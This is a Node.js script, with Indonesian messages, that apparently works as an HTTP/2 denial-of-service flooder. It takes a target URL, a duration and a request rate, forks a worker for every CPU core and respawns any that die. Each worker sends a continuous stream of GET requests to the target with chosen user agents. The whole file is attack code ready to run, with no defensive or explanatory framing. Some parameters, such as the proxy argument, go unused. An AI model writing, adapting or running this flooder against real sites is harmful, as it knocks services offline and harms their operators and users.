const http2 = require('http2');
const fs = require('fs');
const readline = require('readline');
const cluster = require('cluster');
const numCPUs = require('os').cpus().length;

const [url, time, rps, threads, proxy] = process.argv.slice(2);

if (cluster.isMaster) {
  console.log(`Master ${process.pid} sedang berjalan`);
  for (let i = 0; i < numCPUs; i++) cluster.fork();
  cluster.on('exit', (worker, code, signal) => {
    console.log(`Worker ${worker.process.pid} telah berhenti`);
    cluster.fork();
  });
} else {
  const session = http2.connect(`https://${url}`);
  const rl = readline.createInterface({
    input: fs.createReadStream('uastaro'),
    crlfDelay: Infinity
  });

  async function sendRequest(userAgent) {
    try {
      const headers = {
        ':method': 'GET',
        ':path': '/',
        'host': url,
        'connection': 'keep-alive',
        'user-agent': userAgent
      };

      const request = session.request(headers);
      const responsePromise = new Promise((resolve, reject) => {
        request.on('response', resolve);
        request.on('error', reject);
        request.setTimeout(5000, () => {
          request.close();
          reject(new Error('Waktu permintaan habis tanpa respons'));
        });
      });
      request.end();

      const responseHeaders = await responsePromise;
      console.log('Respons diterima:', responseHeaders);
    } catch (error) {
      console.error('Terjadi kesalahan dalam mengirim permintaan:', error);
    }
  }

  rl.question('Masukkan user agent Anda: ', async (userAgent) => {
    const interval = Math.floor(1000 / rps);
    const timer = setInterval(async () => {
      for (let i = 0; i < rps; i++) {
        await sendRequest(userAgent);
      }
    }, interval);

    setTimeout(() => {
      clearInterval(timer);
      session.close();
      console.log('Permintaan terkirim:', rps * time);
      process.exit(0);
    }, time * 1000);
  });
}